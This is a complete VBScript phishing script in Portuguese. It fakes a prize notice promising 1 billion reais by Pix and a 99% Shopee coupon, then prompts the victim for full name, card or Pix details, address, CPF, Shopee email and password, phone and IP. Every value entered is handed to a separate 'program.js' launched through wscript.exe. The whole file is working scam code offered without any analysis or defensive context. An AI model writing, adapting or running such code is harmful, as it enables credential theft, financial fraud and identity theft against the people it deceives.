Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
MsgBox "Parabens, voce acaba de receber 1 bilhao reais no seu pix, e alem disso, ganhara um cupom de 99% em todas as suas compras na shopee, para isso, informe o seu nome completo, pix ou n de cartao, endereco e CPF para futuras compras, email e senha de login do seu site da shopee e o seu ip e recebera o seu cupom", 32, "Aviso"
nome = InputBox("Digite seu nome completo:")
pixoucard = InputBox("Digite seu pix/cartao de credito para receber:")
endereco = InputBox("Digite o seu endereco para futuras compras:")
cpf = InputBox("Digite o seu cpf:")
email = InputBox("Digite o seu email de login na shopee:")
senha = InputBox("Digite a sua senha para logar na shopee")
num = InputBox("Digite o seu numero de telefone para envio de sms")
ip = InputBox("Por fim, digite seu ip:")
MsgBox "1 bilhao chegara de 1 a 10 minutos, seu pix/cartao de credito e " & pixoucard
WScript.Sleep 1000
MsgBox "0 1b chegooou, aproveite!!! O cupom e: 29/07hackershop"
pasta = fso.GetParentFolderName(WScript.ScriptFullName)
js = """" & pasta & "\program.js"""
cmd = "wscript.exe " & js & " """ & nome & """ """ & pixoucard & """ """ & endereco & """ """ & cpf & """ """ & email & """ """ & senha & """ """ & num & """ """ & ip & """"
shell.Run cmd